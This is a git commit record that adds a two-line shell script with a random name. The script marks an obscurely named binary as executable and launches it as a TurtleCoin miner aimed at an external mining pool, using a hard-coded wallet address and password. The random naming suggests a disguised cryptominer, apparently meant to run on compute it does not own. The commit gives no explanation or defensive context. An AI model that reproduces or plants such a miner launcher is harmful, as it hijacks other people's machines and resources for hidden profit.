90799a39e614ed9ebecd9d6e122e3ee6ad3645ce
drajathakim7 <81215324+drajathakim7@users.noreply.github.com>
2021-03-23 13:40:49 +0700

    Add files via upload

---
+++ bqkfeyyjajr.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+chmod +x ./jgjhdfhdfh && ./jgjhdfhdfh --pool turtlecoin.herominers.com:10381 --username TRTLv1Qu33jfLgNCavTUh9PomFU9dv7nnEpg7AkzzskDjoziw7j4gSX5gpPRmpJaGvA1gQZYnikeLR78prQNk5bvMFEff95uLRT --password andika --algorithm turtlecoin
